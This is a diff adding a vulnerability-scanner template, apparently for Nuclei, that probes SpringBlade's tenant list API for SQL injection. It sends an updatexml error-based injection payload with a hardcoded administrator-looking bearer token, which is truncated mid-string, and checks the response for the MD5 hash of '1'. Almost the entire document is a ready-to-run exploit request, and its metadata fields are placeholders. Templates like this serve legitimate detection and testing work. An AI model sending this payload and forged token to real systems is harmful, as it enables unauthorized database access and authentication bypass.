@@ -1,0 +1,22 @@
+id: SpringBlade-tenantlist-SQLi
+info:
+  name: SpringBlade tenantlist SQL 注入漏洞
+  author: wangzong
+  severity: info
+  description: description
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        GET /api/blade-system/tenant/list?updatexml(1,concat(0x7e,md5(1),0x7e),1)=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Blade-Auth: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJ1c2VyX25hbWUiOiJhZG1pbiIsInJlYWxfbmFtZSI6IueuoeeQhuWRmCIsImF1dGhvcml0aWVzIjpbImFkbWluaXN0cmF0b3IiXSwiY2xpZW50
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'c4ca4238a0b923820dcc509a6f75849b'
